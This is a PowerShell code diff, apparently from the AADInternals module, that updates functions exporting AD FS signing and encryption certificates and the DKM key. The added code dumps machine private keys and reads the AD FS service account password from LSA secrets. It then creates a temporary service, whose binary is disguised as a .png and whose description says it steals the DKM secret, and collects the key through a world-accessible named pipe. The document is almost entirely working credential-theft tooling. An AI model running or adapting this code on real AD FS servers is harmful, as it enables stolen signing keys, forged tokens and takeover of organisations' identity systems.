@@ -38,10 +38,20 @@ function Export-ADFSCertificates
         if(!$Configuration)
         {
             $Configuration = Export-ADFSConfiguration -Local
+            if(!$Configuration)
+            {
+                Write-Error "Error retrieving the configuration."
+                return
+            }
         }
         if(!$Key)
         {
             $Key = Export-ADFSEncryptionKey -Local -Configuration $Configuration
+            if(!$Key)
+            {
+                Write-Error "Error retrieving the key."
+                return
+            }
         }
 
         $certs = [ordered]@{}
@@ -63,63 +73,129 @@ function Export-ADFSCertificates
         $cert = $Configuration.ServiceSettingsData.SecurityTokenService.AdditionalEncryptionTokens.CertificateReference
         if($cert.FindValue -eq $certs["encryption"].FindValue)
         {
-            Write-Warning "Additional encryption certificate is same as the current signing certificate and will not be exported."
+            Write-Warning "Additional encryption certificate is same as the current encryption certificate and will not be exported."
         }
         else
         {
             $certs["encryption_additional"] = $cert
         }
 
-        foreach($name in $certs.Keys)
+        foreach($certName in $certs.Keys)
         {
-            Write-Verbose "Decrypting certificate $name"
-            $encPfxBytes = Convert-B64ToByteArray -B64 ($certs[$name].EncryptedPfx)
+            $cert = $certs[$certName]
+            # If EncryptedPfx.nil equals true, this cert is stored in server's certificate store, not in configuration.
+            if($cert.EncryptedPfx.nil -eq "true")
+            {
+                # Get the certificate
+                Write-Verbose "Getting certificate $($cert.FindValue)"
+                $certPath = "Cert:\$($cert.StoreLocationValue)\$($cert.StoreNameValue)\$($cert.FindValue)"
+                $certificate = Get-Item -Path $certPath
+                if($certificate -eq $null)
+                {
+                    Write-Error "Certificate ""$certPath""not found from this computer!"
+                    break
+                }
+                $binCert     = $certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)
 
-            # Get the Key Material - some are needed, some not. 
-            # Values are Der encoded except cipher text and mac, so the first byte is tag and the second one size of the data. 
-            $guid=        $encPfxBytes[8..25]  # 18 bytes
-            $KDF_oid=     $encPfxBytes[26..36] # 11 bytes
-            $MAC_oid=     $encPfxBytes[37..47] # 11 bytes
-            $enc_oid=     $encPfxBytes[48..58] # 11 bytes
-            $nonce=       $encPfxBytes[59..92] # 34 bytes
-            $iv=          $encPfxBytes[93..110] # 18 bytes
-            $ciphertext = $encPfxBytes[115..$($encPfxBytes.Length-33)]
-            $cipherMAC =  $encPfxBytes[$($encPfxBytes.Length-32)..$($encPfxBytes.Length)]
+                # Get the private key
+                $keyName = $certificate.PrivateKey.CspKeyContainerInfo.UniqueKeyContainerName
+                Write-Verbose "Private key name: $keyName"
 
-            # Create the label
-            $label = $enc_oid + $MAC_oid
+                $keyPath = "$env:ALLUSERSPROFILE"
+                
+                # CryptoAPI and CNG stores keys in different directories
+                # https://docs.microsoft.com/en-us/windows/win32/seccng/key-storage-and-retrieval
+                $paths = @(
+                    "$keyPath\Microsoft\Crypto\RSA\MachineKeys\$keyName"
+                    "$keyPath\Microsoft\Crypto\Keys\$keyName"
+                    )
+                foreach($path in $paths)
+                {
+                    $keyBlob = Get-Content $path -Encoding byte -ErrorAction SilentlyContinue
+                    if($keyBlob)
+                    {
+                        Write-Verbose "Key loaded from $path"
+                        break
+                    }
+                }
 
-            # Derive the decryption key using (almost) standard NIST SP 800-108. The last bit array should be the size of the key in bits, but MS is using bytes (?)
-            # As the key size is only 16 bytes (128 bits), no need to loop.
-            $hmac = New-Object System.Security.Cryptography.HMACSHA256 -ArgumentList @(,$key)
-            $hmacOutput = $hmac.ComputeHash( @(0x00,0x00,0x00,0x01) + $label + @(0x00) + $nonce[2..33] + @(0x00,0x00,0x00,0x30) )
-            $decryptionKey = $hmacOutput[0..15]
-            Write-Verbose " Decryption key: $(Convert-ByteArrayToHex -Bytes $decryptionKey)"
+                if(!$keyBlob)
+                {
+                    if($joinInfo.KeyName.EndsWith(".PCPKEY"))
+                    {
+                        # This machine has a TPM
+                        Throw "PCP keys are not supported, unable to export private key!"
+                    }
+                    else
+                    {
+                        Throw "Error accessing key. If you are already elevated to LOCAL SYSTEM, restart PowerShell and try again."
+                    }
+                    return
+                }
+        
+                # Parse the key blob
+                $blobType = [System.BitConverter]::ToInt32($keyBlob,0)
+                switch($blobType)
+                {
+                    1 { $privateKey = Parse-CngBlob  -Data $keyBlob -Decrypt }
+                    2 { $privateKey = Parse-CapiBlob -Data $keyBlob -Decrypt }
+                    default { throw "Unsupported key blob type" }
+                }
+
+                
+                $pfx = New-PfxFile -RSAParameters $privateKey.RSAParameters -X509Certificate $binCert
+            }
+            else
+            {
+                Write-Verbose "Decrypting $certName certificate"
+                $encPfxBytes = Convert-B64ToByteArray -B64 $cert.EncryptedPfx
+
+                # Get the Key Material - some are needed, some not. 
+                # Values are Der encoded except cipher text and mac, so the first byte is tag and the second one size of the data. 
+                $guid=        $encPfxBytes[8..25]  # 18 bytes
+                $KDF_oid=     $encPfxBytes[26..36] # 11 bytes
+                $MAC_oid=     $encPfxBytes[37..47] # 11 bytes
+                $enc_oid=     $encPfxBytes[48..58] # 11 bytes
+                $nonce=       $encPfxBytes[59..92] # 34 bytes
+                $iv=          $encPfxBytes[93..110] # 18 bytes
+                $ciphertext = $encPfxBytes[115..$($encPfxBytes.Length-33)]
+                $cipherMAC =  $encPfxBytes[$($encPfxBytes.Length-32)..$($encPfxBytes.Length)]
+
+                # Create the label
+                $label = $enc_oid + $MAC_oid
+
+                # Derive the decryption key using (almost) standard NIST SP 800-108. The last bit array should be the size of the key in bits, but MS is using bytes (?)
+                # As the key size is only 16 bytes (128 bits), no need to loop.
+                $hmac = New-Object System.Security.Cryptography.HMACSHA256 -ArgumentList @(,$key)
+                $hmacOutput = $hmac.ComputeHash( @(0x00,0x00,0x00,0x01) + $label + @(0x00) + $nonce[2..33] + @(0x00,0x00,0x00,0x30) )
+                $decryptionKey = $hmacOutput[0..15]
+                Write-Verbose " Decryption key: $(Convert-ByteArrayToHex -Bytes $decryptionKey)"
          
-            # Create a decryptor and decrypt
-            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create("AES")
-            $Crypto.Mode="CBC"
-            $Crypto.KeySize = 128
-            $Crypto.BlockSize = 128
-            $Crypto.Padding = "None"
-            $Crypto.Key = $decryptionKey
-            $Crypto.IV = $iv[2..17]
+                # Create a decryptor and decrypt
+                $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create("AES")
+                $Crypto.Mode="CBC"
+                $Crypto.KeySize = 128
+                $Crypto.BlockSize = 128
+                $Crypto.Padding = "None"
+                $Crypto.Key = $decryptionKey
+                $Crypto.IV = $iv[2..17]
 
-            $decryptor = $Crypto.CreateDecryptor()
+                $decryptor = $Crypto.CreateDecryptor()
 
-            # Create a memory stream and write the cipher text to it through CryptoStream
-            $ms = New-Object System.IO.MemoryStream
-            $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
-            $cs.Write($ciphertext,0,$ciphertext.Count)
-            $cs.Close()
-            $cs.Dispose()
+                # Create a memory stream and write the cipher text to it through CryptoStream
+                $ms = New-Object System.IO.MemoryStream
+                $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
+                $cs.Write($ciphertext,0,$ciphertext.Count)
+                $cs.Close()
+                $cs.Dispose()
 
-            # Get the results and export to the file
-            $pfx = $ms.ToArray()
-            $ms.Close()
-            $ms.Dispose()
+                # Get the results and export to the file
+                $pfx = $ms.ToArray()
+                $ms.Close()
+                $ms.Dispose()
+            }
 
-            $pfx |  Set-Content "ADFS_$name.pfx" -Encoding Byte
+            $pfx |  Set-Content "ADFS_$certName.pfx" -Encoding Byte
         }
         
         
@@ -192,27 +268,34 @@ function Export-ADFSConfiguration
         if($Local) # Export configuration data from the local ADFS server
         {
             # Check that we are on ADFS server
-            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
+            $service = Get-Service ADFSSRV -ErrorAction SilentlyContinue
+            if($service -eq $null -or $service.Status -ne "Running")
             {
-                Write-Error "This command needs to be run on ADFS server"
-                return
+                Write-Error "This command needs to be run on AD FS server and the ADFSSRV service must be running."
+                return $null
             }
 
-            # Get the database connection string
-            $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
-            $conn = $ADFS.ConfigurationDatabaseConnectionString
-            
-            Write-Verbose "ConnectionString: $conn"
+            # Reference: https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208
 
-            # Read the configuration from the database
-            $SQLclient =          new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
-            $SQLclient.Open()
-            $SQLcmd =             $SQLclient.CreateCommand()
-            $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"
-            $SQLreader =          $SQLcmd.ExecuteReader()
-            $SQLreader.Read() |   Out-Null
-            $configuration =      $SQLreader.GetTextReader(0).ReadToEnd()
-            $SQLreader.Dispose()
+            # Get configuration data object using .NET Reflection
+            $adfsProperties = Get-AdfsProperties
+            $configObject   = Get-ReflectionProperty -TypeObject $adfsProperties.GetType() -ValueObject $adfsProperties -PropertyName "ServiceSettingsData"
+
+            # Get the service using WMI to get location
+            $adfsService   = Get-WmiObject -Query 'select * from win32_service where name="adfssrv"'
+            $adfsDirectory = (get-item $adfsService.PathName).Directory.FullName
+
+            # Load Microsoft.IdentityServer.dll  
+            $misDll      = [IO.File]::ReadAllBytes((Join-Path -Path $adfsDirectory -ChildPath 'Microsoft.IdentityServer.dll'))
+            $misAssembly = [Reflection.Assembly]::Load($misDll)
+            Remove-Variable "misDll"
+
+            # Load serializer class
+            $serializer = $misAssembly.GetType('Microsoft.IdentityServer.PolicyModel.Configuration.Utility')
+
+            # Convert the configuration object to xml using .NET Reflection
+            # public static string Serialize(ContractObject obj, bool indent = false)
+            $configuration = Invoke-ReflectionMethod -TypeObject $serializer -Method "Serialize" -Parameters @($configObject,$false)
         }
         elseif($AsLoggedInUser) # Read the configuration as the logged in user
         {
@@ -366,8 +449,6 @@ function Export-ADFSEncryptionKey
     Param(
         [Parameter(ParameterSetName="Local", Mandatory=$True)]
         [switch]$Local,
-        [Parameter(ParameterSetName="Local", Mandatory=$False)]
-        [switch]$AsADFS,
         [Parameter(ParameterSetName="Local", Mandatory=$True)]
         [xml]$Configuration,
         [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
@@ -389,57 +470,29 @@ function Export-ADFSEncryptionKey
                 return
             }
 
-            # Get DKM container info
-            $group =     $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
-            $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
-            $parent =    $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
-            $base =      "LDAP://CN=$group,$container,$parent"
-
-            if($AsADFS)
+            # If auto certificate rollover is disabled, certificates are in AD FS servers' certificate stores and KDM key not needed.
+            if(-not (Get-AdfsProperties).AutoCertificateRollover)
             {
-                $serviceWMI = Get-WmiObject Win32_Service -Filter "Name='ADFSSRV'" -ErrorAction SilentlyContinue
-                $ADFSUser=  $serviceWMI.StartName
-
-                $CurrentUser = "{0}\{1}" -f $env:USERDOMAIN,$env:USERNAME
-
-                try
-                {
-                    # Copy the tokens from lsass and adfssrv processes
-                    Write-Verbose "Trying to ""elevate"" by copying token from lsass and then adfssrv processes"
-                    $elevation = [AADInternals.Native]::copyLsassToken() -and [AADInternals.Native]::copyADFSToken()
-                }
-                catch
-                {
-                    $elevation = $false
-                }
-
-                if($elevation)
-                {
-                    Write-Verbose """Elevation"" to ADFS succeeded!"
-                    Write-Warning "Running as ADFS ($ADFSUser). You MUST restart PowerShell to restore $CurrentUser rights."
-                }
-                else
-                {
-                    throw "Could not change to $ADFSUser. MUST be run as administrator!"
-                }
+                Write-Warning "Auto certificate rollover not enabled. DKM key not needed."
+                return $null
             }
 
-            # The "displayName" attribute of "CryptoPolicy" object refers to the value of the "l" attribute of 
-            # the object containing the actual encryption Key in its "thumbnailphoto" attribute.
-            $ADSearch =        [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
-            $ADSearch.Filter = '(name=CryptoPolicy)'
-            $ADSearch.PropertiesToLoad.Clear()
-            $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null
-            $aduser =          $ADSearch.FindOne()
-            $keyObjectGuid =   $ADUser.Properties["displayName"] 
-        
-            # Read the encryption key from AD object
-            $ADSearch.PropertiesToLoad.Clear()
-            $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null
-            $ADSearch.Filter="(l=$keyObjectGuid)"
-            $aduser=$ADSearch.FindOne() 
-            $key=[byte[]]$aduser.Properties["thumbnailphoto"][0] 
-            Write-Verbose "Key object guid: $keyObjectGuid"
+            $ADFSUser    = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\adfssrv" -Name "ObjectName" | Select-Object -ExpandProperty "ObjectName"
+
+            # Get key information using the service
+            # The return value is a JSON file where the key is a hex string
+            $keyInformation = Export-ADFSEncryptionKeyUsingService -Configuration $Configuration -ADFSUser $ADFSUser -ServiceName "AADInternals" -Description "A little service to steal the AD FS DKM secret :)" | ConvertFrom-Json
+
+            # Check for errors
+            if($keyInformation.Error)
+            {
+                Write-Error $keyInformation.Error
+                return $null
+            }
+            
+            $key = Convert-HexToByteArray -HexString ($keyInformation.Key)
+
+            Write-Verbose "Key object guid: $($keyInformation.Guid), created $($keyInformation.Created)"
         }
         else # Export from remote DC using DSR
         {
@@ -1412,4 +1465,159 @@ function New-ADFSAccessToken
         Unload-PrivateKey -PrivateKey $privateKey_signing
     }
 
+}
+
+
+# Exports the AD FS DKM key using Windows Service
+# Aug 23rd 2022
+function Export-ADFSEncryptionKeyUsingService
+{
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$false)]
+        [String]$ServiceName="AADInternals", 
+        [Parameter(Mandatory=$false)]
+        [String]$Description,           
+        [Parameter(Mandatory=$true)]
+        [xml]$Configuration,
+        [Parameter(Mandatory=$true)]
+        [String]$ADFSUser
+      )
+    Begin
+    {
+
+    }
+    Process
+    {
+        # Path to service executable. File extension doesn't matter :)
+        $servicePath="$PSScriptRoot\AADInternals.png"
+
+        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
+        
+        if($service)
+        {
+            Write-Verbose "Service $ServiceName already running, restarting"
+            Restart-Service -Name $ServiceName | Out-Null
+        }
+        else
+        {
+            try
+            {
+                # First, create a service "in a normal way"
+                Write-Verbose "Creating service $ServiceName"
+
+                if(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\adfssrv" -Name "ServiceAccountManaged" -ErrorAction SilentlyContinue)
+                {
+                    # ADFSSRV is running using Group Managed Service Account
+                    Write-Verbose " Creating service to be run as Local System"
+                    $service = New-Service -Name $ServiceName -BinaryPathName $servicePath -Description $Description -ErrorAction Stop     
+
+                    # Change the user to AD FS service account
+                    Write-Verbose " Changing user to $ADFSUser"
+                    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName" -Name "ObjectName"            -Value $ADFSUser
+
+                    # Set the account to service account managed - (not required)
+                    Write-Verbose " Setting ServiceAccoungManaged property"
+                    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName" -Name "ServiceAccountManaged" -Value ([System.BitConverter]::GetBytes([int32]1)) 
+                }
+                else
+                {
+                    # ADFSSRV is running using "legacy" service account so we need to get password from LSAS
+                    Write-Verbose "*** Getting password for $ADFSUser **"
+                    $adfsPassword = (Get-LSASecrets -Users "_SC_adfssrv").PasswordTxt
+                    Write-Verbose "*** Password fetched for $ADFSUser **`n"
+                    $credentials = [pscredential]::new($ADFSUser, ($adfsPassword | ConvertTo-SecureString -AsPlainText -Force))
+
+                    Write-Verbose " Creating service to be run as $ADFSUser with password $adfsPassword"
+                    $service = New-Service -Name $ServiceName -BinaryPathName $servicePath -Description $Description -Credential $credentials -ErrorAction Stop         
+                }
+
+                # Start the service
+                Write-Verbose " Starting service $ServiceName"
+                Start-Service -Name $ServiceName | Out-Null
+            }
+            catch
+            {
+                Write-Error $_
+                return
+            }
+        }
+
+        # Create an output named piped client to connect to the service
+        try 
+        {
+            Write-Verbose " Creating outbound named pipe AADInternals-out"
+            $pipeOut = [System.IO.Pipes.NamedPipeClientStream]::new(".","AADInternals-out")
+            $pipeOut.Connect(5000) # Wait 5 seconds
+
+            $sw = $null 
+            $sw = [System.IO.StreamWriter]::new($pipeOut)
+            $sw.AutoFlush = $true
+    
+            # Send the configuration to the service
+            Write-Verbose " Sending configuration to AADInternals-out"
+            $sw.WriteLine($Configuration.OuterXml)
+        } 
+        catch
+        {
+            Write-Error "Error send message to service: $_"
+            return $null
+        } 
+        finally 
+        {
+            if ($sw) 
+            {
+                $sw.Dispose() 
+            }
+        }
+        if ($pipeOut) 
+        {
+            $pipeOut.Dispose()
+        }
+        
+        # Create an input named piped client to receive the key from the service
+        try 
+        {
+            # Allow everyone to access the pipe
+            $pse = [System.IO.Pipes.PipeSecurity]::new()
+            $sid = [System.Security.Principal.SecurityIdentifier]::new([System.Security.Principal.WellKnownSidType]::WorldSid, $null)
+            $par = [System.IO.Pipes.PipeAccessRule]::new($sid, [System.IO.Pipes.PipeAccessRights]::ReadWrite, [System.Security.AccessControl.AccessControlType]::Allow)
+            $pse.AddAccessRule($par)
+
+            Write-Verbose " Creating inbound named pipe AADInternals-in"
+            $pipeIn = [System.IO.Pipes.NamedPipeServerStream]::new("AADInternals-in",[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Message, [System.IO.Pipes.PipeOptions]::None,4096,4096,$pse)
+            $pipeIn.WaitForConnection()
+
+            Write-Verbose " Reading response from AADInternals-in"
+            $sr = [System.IO.StreamReader]::new($pipeIn)
+            $message = $sr.Readline()
+        } 
+        catch 
+        {
+            Write-Error "Error receiving message from service: $_"
+            return $null
+        } 
+        finally 
+        {
+            if ($sr) 
+            {
+                $sr.Dispose() 
+            }
+            if ($pipeIn) 
+            {
+                $pipeIn.Dispose()
+            }
+        }
+
+        Write-Verbose " Message: $message"
+        return $message 
+    }
+    End
+    {
+        # Stop and delete the service
+        Write-Verbose " Stopping service $ServiceName"
+        Stop-Service $ServiceName -ErrorAction SilentlyContinue | Out-Null
+        Write-Verbose " Deleting service $ServiceName"
+        SC.exe DELETE $ServiceName | Out-Null
+    }
 }
